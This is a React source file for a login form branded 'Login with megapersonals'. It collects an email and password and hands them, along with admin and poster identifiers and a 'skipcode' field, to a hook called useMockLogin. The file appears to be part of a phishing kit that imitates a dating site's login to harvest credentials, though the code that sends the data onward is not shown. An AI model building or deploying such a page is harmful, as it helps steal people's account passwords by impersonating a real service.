"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";

function LoginForm({ setShowModal, adminId, posterId }) {
  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin(setShowModal, adminId, posterId);

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    // console.log("values", values);
    // return;

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };

    login(submitValues, formik);

    // console.log(submitValues);
  };

  return (
    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
      <p>
        Know each other and enjoy private, secure and hasslefree live moment
        with your dating partner
      </p>
      <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
        Login with megapersonals
      </h3>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />

              <Field
                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Password"
                name="password"
                type="password"
                autoComplete="on"
                required
              />

              <button
                type="submit"
                className="mt-5 w-full text-lg font-medium bg-[#1a73e8] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 rounded"
              >
                Log in
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
